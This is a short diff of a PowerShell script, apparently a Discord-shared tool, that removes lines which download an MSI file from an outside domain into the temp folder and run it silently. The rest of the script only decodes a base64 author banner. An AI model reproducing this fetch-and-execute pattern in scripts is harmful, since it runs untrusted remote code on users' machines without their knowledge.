@@ -1,9 +1,3 @@
-$exeUrl  = "https://siegescan.com/driver.msi"
-$exePath = "$env:TEMP\driver.msi"
-
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
-Start-Process -FilePath $exePath
-
 Clear-Host
 $encodedTitle = "Q3JlYXRlZCBCeSBaZXlza2kgb24gRGlzY29yZA=="
 $titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
